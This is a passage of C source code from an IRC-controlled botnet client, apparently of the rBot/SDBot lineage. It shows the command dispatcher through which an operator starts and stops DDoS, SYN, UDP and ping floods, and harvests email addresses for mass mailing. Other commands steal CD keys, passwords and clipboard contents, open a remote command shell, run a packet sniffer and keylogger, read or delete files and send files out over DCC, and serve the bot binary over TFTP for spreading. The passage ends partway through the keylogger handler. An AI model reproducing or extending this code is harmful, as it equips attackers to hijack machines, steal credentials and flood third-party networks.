			stopthread(sock,a[2],notice,silent,"[DDoS]","DDoS flood",DDOS_THREAD,a[s+1]);

			return 1;
		}
		#endif
		#ifndef NO_SYN
		else if (strcmp("synstop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[SYN]","Syn flood",SYN_THREAD,a[s+1]);

			return 1;
		}
		#endif
		#ifndef NO_UDP
		else if (strcmp("udpstop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[UPD]","UDP flood",UDP_THREAD,a[s+1]);

			return 1;
		}
		#endif
		#ifndef NO_PING
		else if (strcmp("pingstop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[PING]","Ping flood",PING_THREAD,a[s+1]);

			return 1;
		}
		#endif
		#ifndef NO_TERM
		else if (strcmp("termstop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[TERM]","Terminate flood",TERM_THREAD,a[s+1]);

			return 1;
		}
		#endif
		else if (strcmp("tftpstop", a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[TFTPD]","Server",TFTP_THREAD,a[s+1]);

			return 1;
		}
		#ifndef NO_FINDFILE
		else if (strcmp("findfilestop",a[s]) == 0 || strcmp("ffstop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[FINDFILE]","Find file",FIND_THREAD,a[s+1]);

			return 1;
		}
		#endif
		#ifndef NO_PROCESS
		else if (strcmp("procsstop",a[s]) == 0 || strcmp("psstop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[PROC]","Process list",PROC_THREAD,a[s+1]);

			return 1;
		}
		#endif
		else if (strcmp("clonestop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[CLONES]","Clone",CLONE_THREAD,a[s+1]);

			return 1;
		}
		else if (strcmp("securestop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[SECURE]","Secure",SECURE_THREAD,a[s+1]);

			return 1;
		}
		else if (strcmp("scanstop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[SCAN]","Scan",SCAN_THREAD,a[s+1]);

			return 1;
		}
		/*else if (strcmp("scandel",a[s]) == 0 || strcmp("sdel",a[s]) == 0) {
		DelPayloadFile(sock,a[2],notice,silent);

		return 1;
		}*/
		else if (strcmp("scanstats",a[s]) == 0 || strcmp("stats",a[s]) == 0) {
			ListExploitStats(sock,a[2],notice);

			return repeat;
		}
		#ifndef NO_EMAIL
		else if (strcmp("massmail",a[s]) == 0) {
			if (parameters['f']) {
				sprintf(sendbuf, "[EMAIL]: Freezing E-Mail search.");
				if (findthreadid(EMAIL_THREAD) == 0) 
					sprintf(sendbuf, "[EMAIL]: Not active.");
				else SearchFreeze(TRUE);
			} else {
				if (findthreadid(EMAIL_THREAD) > 0)
					sprintf(sendbuf,"[EMAIL]: Already active.");
				else {
					sprintf(sendbuf,"[EMAIL]: Searching for e-mail addresses.");
					i = addthread(sendbuf,EMAIL_THREAD,NULL);
					if ((threads[i].tHandle = CreateThread(NULL, 0, &SearchEmail, (LPVOID)i, 0, &id)) == NULL) 
						sprintf(sendbuf,"[EMAIL]: Failed to start email thread, error: <%d>.", GetLastError());
				}
			}
			
			irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return repeat;
		}
		else if (strcmp("massmailstop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[EMAIL]","Mass Mailer",EMAIL_THREAD,a[s+1]);

			return 1;
		}
		#endif
		#ifndef NO_SPEEDTEST
		else if (strcmp("speedtest", a[s]) == 0 || strcmp("test", a[s]) == 0) {
			DoSpeedTest(sock, a[2], notice);

			return repeat;
		}
		#endif
		else if (strcmp("reconnect", a[s]) == 0 || strcmp("r", a[s]) == 0) {
			irc_sendv(sock, "QUIT :reconnecting\r\n");
			addlog("[MAIN]: Reconnecting.");

			return 0;
		}
		else if (strcmp("disconnect", a[s]) == 0 || strcmp("dc", a[s]) == 0) {
			irc_sendv(sock, "QUIT :disconnecting\r\n");
			addlog("[MAIN]: Disconnecting.");

			return -1;
		}
		else if (strcmp("quit", a[s]) == 0 || strcmp("q", a[s]) == 0) {
			if (a[s+1]) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_sendv(sock, "QUIT :%s\r\n", y);
				}
			} else 
				irc_sendv(sock, "QUIT :later\r\n"); 

			return -2;
		}
		else if (strcmp("status", a[s]) == 0 || strcmp("s", a[s]) == 0) {
			sprintf(sendbuf, "[MAIN]: Status: Ready. Bot Uptime: %s.", Uptime(started));
			irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return repeat;
		}
		else if (strcmp("id", a[s]) == 0 || strcmp("i", a[s]) == 0) {
			if (a[s+1] && strcmp(a[s+1],botid) != 0) return repeat;
			sprintf(sendbuf, "[MAIN]: Bot ID: %s.", botid);
			irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return repeat;
		}
		else if (strcmp("reboot", a[s]) == 0) {
			sprintf(sendbuf, ((Reboot())?("[MAIN]: Rebooting system."):("[MAIN]: Failed to reboot system.")));
			irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		else if (strcmp("threads", a[s]) == 0 || strcmp("t", a[s]) == 0) {
			TLIST tlist;
			strncpy(tlist.chan, a[2], sizeof(tlist.chan));
			tlist.sock = sock;
			tlist.notice = notice;
			tlist.silent = silent;
			tlist.full = ((a[s+1])?((strcmp(a[s+1],"sub") == 0)?(true):(false)):(false));

			sprintf(sendbuf, "[THREADS]: List threads.");
			tlist.threadnum = addthread(sendbuf, LIST_THREAD, NULL);
			if (threads[tlist.threadnum].tHandle = CreateThread(NULL, 0, &ListThread, (LPVOID)&tlist, 0, &id)) {
				while (tlist.gotinfo == false)
					Sleep(50);
			} else
				sprintf(sendbuf,"[THREADS]: Failed to start list thread, error: <%d>.", GetLastError());
			addlog(sendbuf);

			return repeat;
		}
		else if (strcmp("aliases", a[s]) == 0 || strcmp("al", a[s]) == 0) {
			aliaslist(sock, a[2], notice);
			addlog("[MAIN]: Alias list.");

			return repeat;
		}
		else if (strcmp("log", a[s]) == 0 || strcmp("lg", a[s]) == 0) {
			SHOWLOG showlog;
			showlog.filter[0] = '\0';
			if (x != NULL && a[s+1]) {
				char *y = strstr(x, a[s+1]);
				if (y != NULL) 
					_snprintf(showlog.filter,sizeof(showlog.filter),"%s",y);
			}
			strncpy(showlog.chan, a[2], sizeof(showlog.chan));
			showlog.sock = sock;
			showlog.notice = notice;
			showlog.silent = silent;

			sprintf(sendbuf, "[LOG]: Listing log.");
			showlog.threadnum = addthread(sendbuf, LOG_THREAD, NULL);
			if (threads[showlog.threadnum].tHandle = CreateThread(NULL, 0, &ShowLogThread, (LPVOID)&showlog, 0, &id)) {
				while (showlog.gotinfo == false)
					Sleep(50);
			} else
				addlogv("[LOG]: Failed to start listing thread, error: <%d>.", GetLastError());

			return 1;
		}
		else if (strcmp("clearlog", a[s]) == 0 || strcmp("clg", a[s]) == 0) {
			clearlog(sock, a[2], notice, silent);

			return 1;
		}
		#ifndef NO_NETINFO
		else if (strcmp("netinfo", a[s]) == 0 || strcmp("ni", a[s]) == 0) {
			irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
			addlog("[MAIN]: Network Info.");

			return repeat;
		}
		#endif
		#ifndef NO_SYSINFO
		else if (strcmp("sysinfo", a[s]) == 0 || strcmp("si", a[s]) == 0) {
			irc_privmsg(sock, a[2], sysinfo(sendbuf, sock), notice);
			addlog("[MAIN]: System Info.");

			return repeat;
		}
		#endif
		else if (strcmp("un1nstall", a[s]) == 0 && strcmp(a[s+1],rmpassword) == 0) {
			if (!silent) irc_privmsg(sock, a[2], "[MAIN]: Removing Bot.", notice);
		#ifdef DEBUG_LOGGING
			closedebuglog();
			#endif
			fclosesocket(sock);
			fWSACleanup();
			uninstall();
			ExitProcess(EXIT_SUCCESS);
		}
		#ifndef NO_PROCESS
		else if (strcmp("procs", a[s]) == 0 || strcmp("ps", a[s]) == 0) {
			if (findthreadid(PROC_THREAD) > 0) {
				if (!silent) irc_privmsg(sock, a[2], "[PROC]: Already running.", notice);
			} else {
				LPROC lproc;
				strncpy(lproc.chan, a[2], sizeof(lproc.chan));
				lproc.sock = sock;
				lproc.notice = notice;
				lproc.silent = silent;
				lproc.full = false;
				if (strcmp("full", a[s+1]) == 0) lproc.full = true;

				sprintf(sendbuf,"[PROCS]: Proccess list.");
				lproc.threadnum = addthread(sendbuf, PROC_THREAD, NULL);
				if (threads[lproc.threadnum].tHandle = CreateThread(NULL, 0, &listProcessesThread, (LPVOID)&lproc, 0, &id)) {
					while (lproc.gotinfo == false)
						Sleep(50);
				} else
					sprintf(sendbuf,"[PROCS]: Failed to start listing thread, error: <%d>.", GetLastError());
				addlog(sendbuf);
			}

			return 1;
		}
		#endif
		#ifndef NO_CDKEYS
		else if (strcmp("getcdkeys", a[s]) == 0 || strcmp("key", a[s]) == 0) {
			getcdkeys(sock,a[2],notice);
			sprintf(sendbuf,"[CDKEYS]: Search completed.");
			if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
			addlog(sendbuf);

			return 1;
		}
		#endif
		else if (strcmp("uptime", a[s]) == 0 || strcmp("up", a[s]) == 0) {
			DWORD uptime = -1, total = GetTickCount() / 1000;

			if(a[s+1])
				uptime = atoi(a[s+1]); 

			if (total/86400 >= uptime || uptime == -1) { 
				sprintf(sendbuf, "[MAIN]: Uptime: %s.", Uptime());
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
			} 

			return repeat;
		}
		else if (strcmp("driveinfo", a[s]) == 0 || strcmp("drv", a[s]) == 0) {
			DriveInfo(sock, a[2], notice, a[s+1]);

			return 1;
		}
		else if (strcmp("testdlls", a[s]) == 0 || strcmp("dll", a[s]) == 0) {
			CheckDLLs(sock,a[2],notice,silent);

			return 1;
		}
		#ifdef DUMP_ENCRYPT
		else if (strcmp("encrypt", a[s]) == 0 || strcmp("enc", a[s]) == 0) {
			encryptstrings((sizeof(authost) / sizeof(LPTSTR)),(sizeof(versionlist) / sizeof(LPTSTR)),sock,a[2],notice);

			return 1;
		}
		#endif
		#ifndef NO_REMOTECMD
		else if (strcmp("opencmd",a[s]) == 0 || strcmp("ocmd", a[s]) == 0) {
			if (findthreadid(RCMD_THREAD) > 0) {
				sprintf(sendbuf ,"[CMD]: Remote shell already running.");
				if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);
			} else {
				if (open_cmd(sock,a[2]) == -1) 
					sprintf(sendbuf,"[CMD]: Couldn't open remote shell.");
				else 
					sprintf(sendbuf,"[CMD]: Remote shell ready.");
				if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);
			}

			return 1;
		}
		else if (strcmp("cmdstop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[CMD]","Remote shell",RCMD_THREAD,a[s+1]);

			return 1;
		}
		#endif
		else if (strcmp("who", a[s]) == 0) {
			if (!silent) irc_privmsg(sock, a[2], "-[Login List]-", notice);
			for (i = 0; i < MAXLOGINS; i++) {
				sprintf(sendbuf,"%d. %s",i,((masters[i][0] != '\0')?(masters[i]+1):("<Empty>")));
				irc_privmsg(sock, a[2], sendbuf, notice, true);
			}
			addlog("[MAIN]: Login list complete.");
		}
		else if (strcmp("getclip", a[s]) == 0 || strcmp("gc", a[s]) == 0) {
			if (!silent) irc_privmsg(sock, a[2], "-[Clipboard Data]-", notice);
			irc_privmsg(sock, a[2], GetClipboardText(), notice);
			addlog("[MAIN]: Get Clipboard.");

			return repeat;
		}
		else if (strcmp("flusharp", a[s]) == 0 || strcmp("farp", a[s]) == 0) {
			if (FlushARPCache())
				_snprintf(sendbuf,sizeof(sendbuf),"[FLUSHARP]: ARP cache flushed.");
			else
				_snprintf(sendbuf,sizeof(sendbuf),"[FLUSHARP]: Failed to flush ARP cache.");

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return repeat;
		}
		else if (strcmp("flushdns", a[s]) == 0 || strcmp("fdns", a[s]) == 0) {
			if (!nodnsapi) {
				if (fDnsFlushResolverCache())
					_snprintf(sendbuf,sizeof(sendbuf),"[FLUSHDNS]: DNS cache flushed.");
				else
					_snprintf(sendbuf,sizeof(sendbuf),"[FLUSHDNS]: Failed to flush DNS cache.");
			} else
				_snprintf(sendbuf,sizeof(sendbuf),"[FLUSHDNS]: Failed to load dnsapi.dll.");

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return repeat;
		}
		else if (strcmp("currentip", a[s]) == 0 || strcmp("cip", a[s]) == 0) {
			int scanthread;
			if (a[s+1])
				scanthread = atoi(a[s+1]);
			else
				scanthread = findthreadnum(SCAN_THREAD);
			if (scanthread != 0)
				currentIP(sock, a[2], notice, scanthread);

			return repeat;
		}
		#ifndef NO_RLOGIND
		else if (strcmp("rloginserver", a[s]) == 0 || strcmp("rlogin", a[s]) == 0) {
			RLOGIND rlogind;

			rlogind.port = ((a[s+1])?((atoi(a[s+1])==0)?(rloginport):(atoi(a[s+1]))):(rloginport));
			strncpy(rlogind.username, ((a[s+2])?(a[s+2]):(user)), sizeof(rlogind.username));
			strncpy(rlogind.hostname, ((a[s+3])?(a[s+3]):("")), sizeof(rlogind.hostname));
			strncpy(rlogind.chan, a[2], sizeof(rlogind.chan));
			rlogind.sock = sock;
			rlogind.notice = notice;
			rlogind.silent = silent;

			sprintf(sendbuf,"[RLOGIND]: Server listening on IP: %s:%d, Username: %s.", GetIP(sock), rlogind.port, rlogind.username);
			rlogind.threadnum = addthread(sendbuf,RLOGIN_THREAD,NULL);
			if (threads[rlogind.threadnum].tHandle = CreateThread(NULL, 0, &RlogindThread, (LPVOID)&rlogind, 0, &id)) {	
				while(rlogind.gotinfo == false)
					Sleep(50);
			} else
				sprintf(sendbuf,"[RLOGIND]: Failed to start server thread, error: <%d>.", GetLastError());

			if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
			addlog(sendbuf);

			return 1;
		}
		#endif
		#ifndef NO_HTTPD
		else if (strcmp("httpserver", a[s]) == 0 || strcmp("http", a[s]) == 0) {
			HTTPD httpd;
			httpd.port = ((a[s+1])?((atoi(a[s+1])==0)?(httpport):(atoi(a[s+1]))):(httpport));
			httpd.enabled = ((parameters['d'])?(false):(true));
			if (a[s+2])
				sprintf(httpd.dir, a[s+2]);
			else {
				char sysdir[MAX_PATH], drive[_MAX_DRIVE];
				GetSystemDirectory(sysdir,sizeof(sysdir));
				_splitpath(sysdir, drive, NULL, NULL, NULL);
			}
			if (httpd.dir[strlen(httpd.dir)-1] == 92) 
				httpd.dir[strlen(httpd.dir)-1] = '\0';
			httpd.sock = sock;
			strncpy(httpd.chan, a[2], sizeof(httpd.chan));
			httpd.notice = notice;
			httpd.silent = silent;

			sprintf(sendbuf,"[HTTPD]: Server listening on IP: %s:%d, Directory: %s\\.", GetIP(sock), httpd.port, httpd.dir);
			httpd.threadnum = addthread(sendbuf,HTTP_THREAD,NULL);
			if (threads[httpd.threadnum].tHandle = CreateThread(NULL, 0, &HTTP_Server_Thread, (LPVOID)&httpd, 0, &id)) {	
				while(httpd.info == false)
					Sleep(50);
			} else
				sprintf(sendbuf,"[HTTPD]: Failed to start server thread, error: <%d>.", GetLastError());

			if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
			addlog(sendbuf);

			return 1;
		}
		#endif
		else if (strcmp("tftpserver", a[s]) == 0 || strcmp("tftp", a[s]) == 0) {
			if (findthreadid(TFTP_THREAD) > 0)
				sprintf(sendbuf ,"[TFTPD]: Already running.");
			else {
				TFTP tftp;
				(a[s+1])?(_snprintf(tftp.filename, sizeof(tftp.filename), a[s+1])):(GetModuleFileName(0,tftp.filename,sizeof(tftp.filename)));
				strncpy(tftp.requestname, ((a[s+2])?(a[s+2]):(filename)), sizeof(tftp.requestname));
				tftp.port = tftpport;
				tftp.threads = 0;
				tftp.sock = sock;
				strncpy(tftp.chan, a[2], sizeof(tftp.chan)-1);
				tftp.notice = notice;
				tftp.silent = silent;

				sprintf(sendbuf, "[TFTPD]: Server started on Port: %d, File: %s, Request: %s.", tftp.port, tftp.filename, tftp.requestname);
				tftp.threadnum = addthread(sendbuf,TFTP_THREAD,NULL);
				if (threads[tftp.threadnum].tHandle = CreateThread(NULL, 0, &tftpserver, (LPVOID)&tftp, 0, &id)) {
					while (tftp.gotinfo == false) 
						Sleep(50);
				} else
					sprintf(sendbuf,"[TFTPD]: Failed to start server thread, error: <%d>.", GetLastError());
			}
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		#ifndef NO_CRASH
		else if (strcmp("crash", a[s]) == 0) {
			sprintf(sendbuf,"[MAIN]: Crashing bot.");
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			strcmp(a[s+5],"crash"); // yes, this will crash.

			return 1;
		}
		#endif
		#ifndef NO_FINDPASS
		else if (strcmp("findpass", a[s]) == 0 || strcmp("fp", a[s]) == 0) { 
			FINDPASS findpass;
			strncpy(findpass.chan, a[2], sizeof(findpass.chan));
			findpass.sock = sock;
			findpass.notice = notice;
			findpass.silent = silent;

			_snprintf(sendbuf, sizeof(sendbuf),"[FINDPASS]: Searching for password.");
			findpass.threadnum = addthread(sendbuf, PASS_THREAD, NULL);
			if (threads[findpass.threadnum].tHandle = CreateThread(NULL, 0, &FindPassThread, (LPVOID)&findpass, 0, &id)) {
				while (findpass.gotinfo == false)
					Sleep(50);
			} else
				sprintf(sendbuf,"[FINDPASS]: Failed to start search thread, error: <%d>.", GetLastError());
			addlog(sendbuf);

			return 1;
		}
		#endif

		// commands requiring at least 1 parameter
		else if (a[s+1] == NULL) return 1;
		else if (strcmp("nick", a[s]) == 0 || strcmp("n", a[s]) == 0) {
			irc_sendv(sock, "NICK %s\r\n", a[s+1]);
			addlogv("[MAIN]: Nick changed to: '%s'.",a[s+1]);

			return repeat;
		}
		else if (strcmp("j0in", a[s]) == 0) {
			irc_sendv(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
			addlogv("[MAIN]: Joined channel: '%s'.",a[s+1]);

			return repeat;
		}
		else if (strcmp("p4rt", a[s]) == 0) {
			irc_sendv(sock, "PART %s\r\n", a[s+1]);
			addlogv("[MAIN]: Parted channel: '%s'.",a[s+1]);

			if (strcmp(a[s+1],channel) == 0) {
				Sleep(FLOOD_DELAY);
				irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
			}
			return repeat;
		}
		else if (strcmp("r4w", a[s]) == 0) {
			if (x != NULL) {
				char *y = strstr(x, a[s+1]);
				if (y != NULL) {
					irc_sendv(sock, "%s\r\n", y);
					addlogv("[MAIN]: IRC Raw: %s.",y);
				}
			}

			return repeat;
		}
		else if (strcmp("killthread", a[s]) == 0 || strcmp("k", a[s]) == 0) {
			if (strcmp("all", a[s+1]) == 0) {
				if ((i=killthreadall()) > 0)
					sprintf(sendbuf,"[THREADS]: Stopped: %d thread(s).", i);
				else
					sprintf(sendbuf,"[THREADS]: No active threads found.");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);					
			} else {
				for (i = s+1; i < (sizeof(a)/4); i++) {
					if (a[i]==NULL) break;

					if (killthread(atoi(a[i])))
						sprintf(sendbuf,"[THREADS]: Killed thread: %s.",a[i]);
					else 
						sprintf(sendbuf,"[THREADS]: Failed to kill thread: %s.",a[i]);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				}
			}

			return 1;
		}
		else if (strcmp("c_quit", a[s]) == 0 || strcmp("c_q", a[s]) == 0) {
			if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
				irc_sendv(threads[atoi(a[s+1])].sock, "QUIT :later\r\n");
				Sleep(500);
				fclosesocket(threads[atoi(a[s+1])].sock);
				TerminateThread(threads[atoi(a[s+1])].tHandle, id);
				threads[atoi(a[s+1])].tHandle = 0;
				threads[atoi(a[s+1])].name[0] = '\0';
			}

			return 1;
		}
		else if (strcmp("c_rndnick", a[s]) == 0 || strcmp("c_rn", a[s]) == 0) {
			if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
				sprintf(sendbuf, "NICK %s", rndnick(ntmp));
				irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);
			}

			return repeat;
		}
		else if (strcmp("prefix", a[s]) == 0 || strcmp("pr", a[s]) == 0) {
			prefix = a[s+1][0];
			sprintf(sendbuf,"[MAIN]: Prefix changed to: '%c'.",a[s+1][0]);
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		else if (strcmp("op3n", a[s]) == 0) {
			if (fShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW))
				sprintf(sendbuf,"[SHELL]: File opened: %s", a[s+1]);
			else
				sprintf(sendbuf,"[SHELL]: Couldn't open file: %s", a[s+1]);
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return repeat;
		}
		else if (strcmp("s3rver", a[s]) == 0) {
			strncpy(server,  a[s+1], 127);
			sprintf(sendbuf,"[MAIN]: Server changed to: '%s'.",a[s+1]);
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		else if (strcmp("dns", a[s]) == 0 || strcmp("dn", a[s]) == 0) {
			LPHOSTENT hostent = NULL;
			IN_ADDR iaddr;
			DWORD addr = finet_addr(a[s+1]);

			if (addr != INADDR_NONE) {
				hostent = fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
				if (hostent != NULL)
					sprintf(sendbuf, "[DNS]: Lookup: %s -> %s.", a[s+1], hostent->h_name);
			}
			else {
				hostent = fgethostbyname(a[s+1]);
				if (hostent != NULL) {
					iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
					sprintf(sendbuf, "[DNS]: Lookup: %s -> %s.", a[s+1], finet_ntoa(iaddr));
				}
			}
			if (hostent == NULL)
				sprintf(sendbuf,"[DNS]: Couldn't resolve hostname.");
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return repeat;
		}
		#ifndef NO_PROCESS
		else if (strcmp("killproc",a[s]) == 0 || strcmp("kp", a[s]) == 0) {  // kill process name
			if(listProcesses(sock,NULL,notice,a[s+1]) == 1)
				sprintf(sendbuf,"[PROC]: Process killed: %s",a[s+1]);
			else
				sprintf(sendbuf,"[PROC]: Failed to terminate process: %s", a[s+1]);
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return repeat;
		}
		else if (strcmp("kill",a[s]) == 0 || strcmp("ki", a[s]) == 0) {  // kill process id
			if(killProcess(atoi(a[s+1])) == 1)
				sprintf(sendbuf,"[PROC]: Process killed ID: %s",a[s+1]);
			else
				sprintf(sendbuf,"[PROC]: Failed to terminate process ID: %s", a[s+1]);
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		#endif
		else if (strcmp("delete", a[s]) == 0 || strcmp("del", a[s]) == 0) { 
			if (DeleteFile(a[s+1])) 
				_snprintf(sendbuf,sizeof(sendbuf),"[FILE]: Deleted '%s'.",a[s+1]);
			else 
				_snprintf(sendbuf,sizeof(sendbuf),PrintError("[FILE]:"));

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return repeat;
		}
		#ifndef NO_DCC
		else if (strcmp("get", a[s]) == 0 || strcmp("gt", a[s]) == 0) {
			DCC dcc;
			memset(dcc.host,0,sizeof(dcc.host));
			sprintf(dcc.filename,"%s",a[s+1]);

			dcc.sock = sock;
			strncpy(dcc.sendto,user,sizeof(dcc.sendto));
			dcc.notice = notice;
			dcc.silent = silent;

			sprintf(sendbuf,"[DCC]: Send File: %s, User: %s.",dcc.filename,dcc.sendto);
			dcc.threadnum=addthread(sendbuf,DCC_THREAD,NULL);
			if (threads[dcc.threadnum].tHandle = CreateThread(NULL, 0, &DCCSendThread, (LPVOID)&dcc, 0, &id)) {
				while (dcc.gotinfo == false) 
					Sleep(50);
			} else
				sprintf(sendbuf,"[DCC]: Failed to start transfer thread, error: <%d>.", GetLastError());
			addlog(sendbuf);

			return 1;
		}
		#endif
		else if (strcmp("list", a[s]) == 0 || strcmp("li", a[s]) == 0) { 
			GetFiles(a[s+1],sock,a[2],NULL);
			addlogv("[FILE]: List: %s", a[s+1]);

			return repeat;
		}
		#ifndef NO_VISIT
		else if (strcmp("visit", a[s]) == 0 || strcmp("v", a[s]) == 0) {
			VISIT visit;
			strncpy(visit.host, a[s+1], sizeof(visit.host)-1);
			if (a[s+2] != NULL) 
				strncpy(visit.referer, a[s+2], sizeof(visit.referer)-1);
			strncpy(visit.chan, a[2], sizeof(visit.chan)-1);
			visit.sock = sock;
			visit.silent = silent;
			visit.notice = notice;

			sprintf(sendbuf,"[VISIT]: URL: %s.",a[s+1]);
			visit.threadnum=addthread(sendbuf,VISIT_THREAD,NULL);
			if (threads[visit.threadnum].tHandle = CreateThread(NULL, 0, &VisitThread, (LPVOID)&visit, 0, &id)) {
				while(visit.gotinfo == false)
					Sleep(50);
			} else
				sprintf(sendbuf,"[VISIT]: Failed to start connection thread, error: <%d>.", GetLastError());
			addlog(sendbuf);

			return repeat;
		}
		#endif
		else if (strcmp("mirccmd", a[s]) == 0 || strcmp("mcmd", a[s]) == 0) {
			if (x != NULL) {
				char *y = strstr(x, a[s+1]); 
				if (y != NULL) {
					if (!mirccmd(y))
						_snprintf(sendbuf, sizeof(sendbuf),"[mIRC]: Client not open.");
					else
						_snprintf(sendbuf, sizeof(sendbuf),"[mIRC]: Command sent.");
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				}
			}

			return repeat;
		}
		else if (strcmp("mircinfo", a[s]) == 0 || strcmp("minfo", a[s]) == 0) {
			if (a[s+1]) mircinfo(a[s+1],sock,a[2],notice,silent);

			return repeat;
		}
		#ifndef NO_REMOTECMD
		else if (strcmp("cmd", a[s]) == 0) {
			if (x != NULL) {
				char *y = strstr(x, a[s+1]); 
				if (y != NULL) { 
					strcat(y,"\n");
					if (!send_commands(y)) {
						sprintf(sendbuf,"[CMD]: Error sending to remote shell.");
						if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					}
					else
						sprintf(sendbuf,"[CMD]: Commands: %s",y);
					addlog(sendbuf);
				}
			}

			return repeat;
		}
		#endif
		else if (strcmp("readfile", a[s]) == 0 || strcmp("rf", a[s]) == 0) {
			FILE *fp;
			if ((fp = fopen(a[s+1],"r")) != NULL) {
				while (fgets(sendbuf,sizeof(sendbuf),fp) != NULL)
					irc_privmsg(sock, a[2], sendbuf, notice, true);
				fclose(fp);
				sprintf(sendbuf,"[MAIN]: Read file complete: %s",a[s+1]);
			} else {
				sprintf(sendbuf,"[MAIN]: Read file failed: %s",a[s+1]);
				if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
			}
			addlog(sendbuf);

			return repeat;
		}
		#ifndef NO_PSNIFF
		else if (strcmp("psniff", a[s]) == 0) {
			if (strcmp("on", a[s+1]) == 0) {
				if (findthreadid(PSNIFF_THREAD) > 0)
					sprintf(sendbuf ,"[PSNIFF]: Already running.");
				else {
					PSNIFF sniff;
					sniff.sock = sock;
					sniff.notice = notice;
					sniff.silent = silent;
					strncpy(sniff.chan, ((a[s+2])?(a[s+2]):((strcmp(psniffchan,"")==0)?(a[2]):(psniffchan))), sizeof(sniff.chan));

					sprintf(sendbuf, "[PSNIFF]: Carnivore packet sniffer active.");
					sniff.threadnum = addthread(sendbuf, PSNIFF_THREAD, NULL);
					if (threads[sniff.threadnum].tHandle = CreateThread(NULL, 0, &SniffThread, (LPVOID)&sniff, 0, &id)) {
						while(sniff.gotinfo == false)
							Sleep(50);
					} else
						sprintf(sendbuf,"[PSNIFF]: Failed to start sniffer thread, error: <%d>.", GetLastError());
				}
			}
			else if (strcmp("off", a[s+1]) == 0) {
				if ((i=killthreadid(PSNIFF_THREAD)) > 0)
					sprintf(sendbuf,"[PSNIFF]: Carnivore stopped. (%d thread(s) stopped.)",i);
				else
					sprintf(sendbuf,"[PSNIFF]: No Carnivore thread found.");
			}
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		#endif
		#ifndef NO_IDENT
		else if (strcmp("ident", a[s]) == 0) {
			if (strcmp("on", a[s+1]) == 0) {
				if (findthreadid(IDENT_THREAD) > 0)
					sprintf(sendbuf ,"[IDENT]: Already running.");
				else {
					sprintf(sendbuf,"[IDENTD]: Server running on Port: 113.");
					i = addthread(sendbuf,IDENT_THREAD,NULL);
					if ((threads[i].tHandle = CreateThread(NULL, 0, &IdentThread, (LPVOID)i, 0, &id)) == NULL)
						sprintf(sendbuf,"[IDENTD]: Failed to start server, error: <%d>.", GetLastError());
				}
			}
			else if (strcmp("off", a[s+1]) == 0) {
				if ((i=killthreadid(IDENT_THREAD)) > 0)
					sprintf(sendbuf,"[IDENT]: Server stopped. (%d thread(s) stopped.)",i);
				else
					sprintf(sendbuf,"[IDENT]: No thread found.");
			}
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		#endif
		#ifndef NO_KEYLOG
		else if (strcmp("keylog", a[s]) == 0) {
			if (strcmp("on", a[s+1]) == 0 || strcmp("file", a[s+1]) == 0) {
				if (findthreadid(KEYLOG_THREAD) > 0)
					sprintf(sendbuf ,"[KEYLOG]: Already running.");
				else {
					KEYLOG keylog;
					keylog.sock = sock;
